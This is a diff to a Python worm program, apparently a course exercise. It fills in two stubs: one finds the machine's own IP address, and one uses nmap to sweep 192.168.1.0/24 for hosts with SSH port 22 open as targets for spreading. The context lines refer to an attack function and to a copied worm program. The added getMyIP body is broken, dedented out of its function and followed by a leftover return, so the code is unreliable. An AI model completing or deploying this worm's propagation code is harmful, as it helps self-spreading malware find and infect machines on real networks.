@@ -141,8 +141,27 @@ def attackSystem(host):
 ####################################################
 def getMyIP(interface):
 
-	# TODO: Change this to retrieve and
-	# return the IP of the current system.
+# Get all the network interfaces on the system
+networkInterfaces = netifaces.interfaces()
+
+# The IP address
+ipAddr = None
+
+# Go through all the interfaces
+for netFace in networkInterfaces:
+
+	# The IP address of the interface
+	addr = netifaces.ifaddresses(netFace)[2][0]['addr']
+
+	# Get the IP address
+	if not addr == "127.0.0.1":
+
+		# Save the IP addrss and break
+		ipAddr = addr
+		break
+
+return ipAddr
+
 	return None
 
 #######################################################
@@ -155,7 +174,33 @@ def getHostsOnTheSameNetwork():
 	# for hosts on the same network
 	# and return the list of discovered
 	# IP addresses.
-	pass
+	# pass
+
+	# Create an instance of the port scanner class
+	portScanner = nmap.PortScanner()
+
+	# Scan the network for systems whose
+	# port 22 is open (that is, there is possibly
+	# SSH running there).
+	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
+		
+	# Scan the network for hoss
+	hostInfo = portScanner.all_hosts()
+
+	# The list of hosts that are up.
+	liveHosts = []
+
+	# Go trough all the hosts returned by nmap
+	# and remove all who are not up and running
+	for host in hostInfo:
+
+		# Is ths host up?
+		if portScanner[host].state() == "up":
+			liveHosts.append(host)
+
+
+
+	return liveHosts
 
 #######################################################
 # Clean by removing the marker and copied worm program
